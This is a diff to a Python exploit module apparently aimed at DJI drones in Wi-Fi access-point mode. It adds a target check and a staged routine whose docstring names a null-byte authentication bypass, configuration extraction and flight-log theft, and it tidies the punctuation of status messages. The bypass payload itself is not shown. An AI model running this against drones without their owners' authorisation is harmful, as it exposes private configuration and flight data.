@@ -139,6 +139,16 @@ class Exploit(HTTPClient):
 
     def run(self) -> None:
         print_warning("[LEGAL] Only use against drones you own or have written authorization to test")
+
+        if not self.check():
+            print_error("Target does not appear to be a DJI drone in Wi-Fi AP mode")
+            return
+
+        print_success("DJI drone detected, launching exploit...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: null-byte auth bypass, config extraction, flight log theft."""
         scheme = "https" if self.ssl else "http"
         base = f"{scheme}://{self.target}:{self.port}"
 
@@ -151,9 +161,9 @@ class Exploit(HTTPClient):
                     print_success("[Stage 1] DJI drone confirmed")
                     print_info(f"[Stage 1] Version info: {res.text[:256]}")
                 else:
-                    print_warning("[Stage 1] DJI fingerprint not confirmed — proceeding")
+                    print_warning("[Stage 1] DJI fingerprint not confirmed; proceeding")
             else:
-                print_warning("[Stage 1] No response — ensure you are connected to drone AP")
+                print_warning("[Stage 1] No response; ensure you are connected to drone AP")
                 return
         except Exception as e:
             print_error(f"[Stage 1] Connection failed: {e}")
@@ -169,9 +179,9 @@ class Exploit(HTTPClient):
                 print_success("[Stage 2] Auth bypass confirmed!")
                 print_info(f"[Stage 2] Config data: {res.text[:512]}")
             elif res and res.status_code == 401:
-                print_warning("[Stage 2] 401 — bypass failed (firmware may be patched)")
+                print_warning("[Stage 2] 401: bypass failed (firmware may be patched)")
             else:
-                print_warning("[Stage 2] HTTP {} — uncertain".format(
+                print_warning("[Stage 2] HTTP {}: uncertain".format(
                     res.status_code if res else "no response"))
         except Exception as e:
             print_warning(f"[Stage 2] Bypass check error: {e}")
